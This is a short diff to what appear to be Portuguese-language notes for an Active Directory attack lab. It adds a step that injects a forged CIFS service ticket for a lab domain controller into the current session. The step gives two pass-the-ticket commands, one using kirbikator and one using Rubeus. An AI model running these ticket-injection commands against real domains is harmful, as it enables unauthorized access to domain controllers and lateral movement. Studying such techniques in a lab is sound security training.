@@ -3104,3 +3104,12 @@ cd .\kekeo_old\
 ```
 .\asktgs.exe C:\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 ```
+6. KEKEO OLD - INJECTAR O TICKET CRIADO  
+```
+.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+```
+ou
+```
+.\Rubeus.exe ptt /ticket:CIFS.mcorp-dc.moneycorp.local.kirbi
+```
+
